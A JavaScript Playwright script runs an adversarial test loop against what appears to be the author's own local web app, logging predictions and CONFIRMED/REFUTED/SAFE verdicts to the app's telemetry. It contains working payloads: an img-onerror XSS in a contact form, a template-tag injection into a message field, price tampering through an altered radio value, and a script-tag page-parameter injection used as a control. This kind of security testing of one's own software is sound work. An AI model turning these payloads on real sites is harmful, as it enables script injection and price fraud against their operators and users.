/*
 * attack.js — adversarial loop against the live congruency app.
 * For each vector: record a PREDICTION to the telemetry "stack", drive a real
 * browser to carry out the attack, then record the RESULT + verdict.
 *   CONFIRMED = attack worked as predicted   REFUTED = prediction wrong
 *   SAFE      = defense held as predicted
 * Loops ITER times (env, default 1). Each scenario runs in an isolated context.
 */
const { chromium } = require('playwright');
const BASE = process.env.BASE || 'http://127.0.0.1:8899';
const ITER = parseInt(process.env.ITER || '1', 10);

async function predict(rec) {
  const r = await fetch(BASE + '/?telemetry=predict', { method: 'POST', body: JSON.stringify(rec) });
  return (await r.json()).id;
}
async function result(rec) {
  await fetch(BASE + '/?telemetry=result', { method: 'POST', body: JSON.stringify(rec) });
}

const scenarios = [
  {
    name: 'contact-xss',
    page: '?page=forms',
    vector: "fullName = <img src=x onerror=console.error('XSS-CONTACT-FIRED')>",
    prediction: 'TextField reflects the value unescaped, so the injected onerror executes (console captures it).',
    async run(ctx) {
      const page = await ctx.newPage();
      const logs = [];
      page.on('console', m => logs.push(m.text()));
      await page.goto(BASE + '/?page=forms', { waitUntil: 'load' });
      await page.fill('form#contact input[name=fullName]', "<img src=x onerror=console.error('XSS-CONTACT-FIRED')>");
      await page.fill('form#contact input[name=email]', 'a@b.c');
      await Promise.all([page.waitForLoadState('load'), page.click('form#contact input[type=submit]')]);
      await page.waitForTimeout(300);
      const fired = logs.some(l => l.includes('XSS-CONTACT-FIRED'));
      const raw = (await page.content()).includes('onerror=console.error');
      await page.close();
      return {
        result: fired ? 'XSS executed — onerror fired.' : (raw ? 'reflected unescaped but did not fire' : 'escaped/blocked'),
        evidence: (fired ? 'console:XSS-CONTACT-FIRED; ' : '') + (raw ? 'raw onerror in DOM' : 'no raw onerror'),
        verdict: fired ? 'CONFIRMED' : (raw ? 'CONFIRMED' : 'REFUTED'),
      };
    },
  },
  {
    name: 'ssti-tag-injection',
    page: '?page=forms',
    vector: 'message = <<<BugDemo(lifo)>>>',
    prediction: 'Input echoed into FormTag output is re-scanned by execute_all_tags, so an injected tag runs a server component (LIFO CONFIRMED appears).',
    async run(ctx) {
      const page = await ctx.newPage();
      await page.goto(BASE + '/?page=forms', { waitUntil: 'load' });
      await page.fill('form#contact input[name=fullName]', 'attacker');
      await page.fill('form#contact input[name=email]', 'a@b.c');
      await page.fill('form#contact textarea[name=message]', '<<<BugDemo(lifo)>>>');
      await Promise.all([page.waitForLoadState('load'), page.click('form#contact input[type=submit]')]);
      const html = await page.content();
      await page.close();
      // BugDemo(lifo) renders the command-queue box; that string proves execution.
      const executed = html.includes('command-queue ordering') || html.includes('array_pop');
      const literal = html.includes('&lt;&lt;&lt;BugDemo') || html.includes('<<<BugDemo');
      return {
        result: executed ? 'SSTI — injected tag executed a server component.' : (literal ? 'tag left literal (not executed)' : 'input dropped'),
        evidence: executed ? 'output contains BugDemo LIFO CONFIRMED' : (literal ? 'literal <<<BugDemo present' : 'neither'),
        verdict: executed ? 'CONFIRMED' : 'REFUTED',
      };
    },
  },
  {
    name: 'price-tampering',
    page: '?page=config',
    vector: "colour radio value := ## Price=99999.99 ## Description=PWNED ##",
    prediction: 'The radio value carries the price and the server trusts the client copy, so a tampered value sets an attacker-chosen price/description in the estimate.',
    async run(ctx) {
      const page = await ctx.newPage();
      await page.goto(BASE + '/?page=config&fresh=1', { waitUntil: 'load' });
      await page.evaluate(() => {
        const r = document.querySelector('input[name=colour]');
        if (r) { r.value = '## Price=99999.99 ## Description=PWNED ## '; r.checked = true; }
      });
      await Promise.all([page.waitForLoadState('load'), page.click('input[type=submit]')]);
      const html = await page.content();
      await page.close();
      const pwned = html.includes('PWNED') && html.includes('99999.99');
      return {
        result: pwned ? 'Price tampered — attacker-chosen price accepted into the estimate.' : 'tampered value not reflected',
        evidence: pwned ? 'estimate shows PWNED / $99999.99' : 'no PWNED in estimate',
        verdict: pwned ? 'CONFIRMED' : 'REFUTED',
      };
    },
  },
  {
    name: 'pagekey-injection (control)',
    page: '?page=<script>',
    vector: "?page=<script>alert('XSS')</script>",
    prediction: 'validatePageKey whitelists [A-Za-z]{2,} with exact-match, so the payload is rejected and the 404 fallback renders — no injection.',
    async run(ctx) {
      const page = await ctx.newPage();
      let dialog = false;
      page.on('dialog', async d => { dialog = true; await d.dismiss(); });
      await page.goto(BASE + "/?page=<script>alert('XSS')</script>", { waitUntil: 'load' });
      await page.waitForTimeout(200);
      const html = await page.content();
      await page.close();
      const blocked = !dialog && (html.includes('No such page') || html.includes('not found'));
      return {
        result: blocked ? 'Blocked — payload rejected, 404 fallback rendered.' : 'NOT blocked — payload reached output',
        evidence: (dialog ? 'ALERT FIRED; ' : 'no alert; ') + (html.includes('No such page') ? '404 fallback shown' : 'no 404'),
        verdict: blocked ? 'SAFE' : 'REFUTED',
      };
    },
  },
];

(async () => {
  const browser = await chromium.launch({ args: ['--no-sandbox'] });
  console.log(`Attacking ${BASE} — ${ITER} iteration(s), ${scenarios.length} vectors each\n`);
  for (let it = 1; it <= ITER; it++) {
    for (const s of scenarios) {
      const id = await predict({ iteration: it, name: s.name, page: s.page, vector: s.vector, prediction: s.prediction });
      let out;
      try {
        const ctx = await browser.newContext();
        out = await s.run(ctx);
        await ctx.close();
      } catch (e) {
        out = { result: 'harness error: ' + e.message.split('\n')[0], evidence: '', verdict: 'REFUTED' };
      }
      await result({ id, ...out });
      console.log(`[iter ${it}] #${id} ${s.name.padEnd(26)} ${out.verdict.padEnd(10)} ${out.result}`);
    }
  }
  await browser.close();
  console.log('\nStack: ' + BASE + '/?telemetry=attacks');
})();
